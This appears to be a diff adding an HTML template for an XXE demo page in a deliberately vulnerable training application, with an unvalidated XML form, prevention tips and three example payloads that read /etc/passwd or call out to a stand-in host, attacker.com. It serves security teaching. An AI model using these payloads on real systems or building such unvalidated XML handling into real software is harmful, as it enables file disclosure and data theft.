@@ -1,0 +1,86 @@
+{% extends "base.html" %}
+
+{% block content %}
+<div class="page-header">
+    <h2>📄 XXE (XML External Entity) Demo</h2>
+    <p>Learn how XML parsing can lead to information disclosure and attacks</p>
+</div>
+
+<div class="vulnerability-demo">
+    <div class="demo-card">
+        <div class="demo-header">
+            <h3>🎯 XXE Attack Simulation</h3>
+            <span class="difficulty">Difficulty: ⭐⭐⭐⭐</span>
+        </div>
+        
+        <div class="demo-content">
+            <p><strong>What is XXE?</strong> XXE attacks exploit XML parsers that process external entities, allowing attackers to read files or perform network requests.</p>
+            
+            <div class="hint-section">
+                <h4>💡 How XXE Works:</h4>
+                <ol>
+                    <li>Application processes XML input from users</li>
+                    <li>XML parser resolves external entities</li>
+                    <li>No validation of external entity sources</li>
+                    <li>Attacker can read files or make requests</li>
+                </ol>
+            </div>
+            
+            <div class="demo-form">
+                <h4>🔧 XXE Attack Demo</h4>
+                <p>This form processes XML without validation - try XXE payloads!</p>
+                
+                <form action="/xxe-demo" method="POST">
+                    <div class="form-group">
+                        <label for="xml_data">Enter XML data:</label>
+                        <textarea name="xml_data" id="xml_data" rows="8" placeholder="Enter XML data here..." required></textarea>
+                    </div>
+                    <button type="submit">📄 Process XML (No Validation!)</button>
+                </form>
+            </div>
+            
+            <div class="payload-examples">
+                <h4>🔧 XXE Attack Examples:</h4>
+                <div class="payload-section">
+                    <h5>Basic XXE (File Read):</h5>
+                    <code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;<br>
+                    &lt;!DOCTYPE root [<br>
+                    &nbsp;&nbsp;&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;<br>
+                    ]&gt;<br>
+                    &lt;root&gt;&amp;xxe;&lt;/root&gt;</code>
+                </div>
+                
+                <div class="payload-section">
+                    <h5>Blind XXE (Out-of-band):</h5>
+                    <code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;<br>
+                    &lt;!DOCTYPE root [<br>
+                    &nbsp;&nbsp;&lt;!ENTITY xxe SYSTEM "http://attacker.com/xxe"&gt;<br>
+                    ]&gt;<br>
+                    &lt;root&gt;&amp;xxe;&lt;/root&gt;</code>
+                </div>
+                
+                <div class="payload-section">
+                    <h5>Parameter Entity XXE:</h5>
+                    <code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;<br>
+                    &lt;!DOCTYPE root [<br>
+                    &nbsp;&nbsp;&lt;!ENTITY % xxe SYSTEM "file:///etc/passwd"&gt;<br>
+                    &nbsp;&nbsp;%xxe;<br>
+                    ]&gt;<br>
+                    &lt;root&gt;test&lt;/root&gt;</code>
+                </div>
+            </div>
+            
+            <div class="protection-tips">
+                <h4>🛡️ How to Prevent XXE:</h4>
+                <ul>
+                    <li>Disable external entity processing</li>
+                    <li>Use XML parsers with XXE protection</li>
+                    <li>Validate XML input against schemas</li>
+                    <li>Use whitelist of allowed XML elements</li>
+                    <li>Consider using JSON instead of XML</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
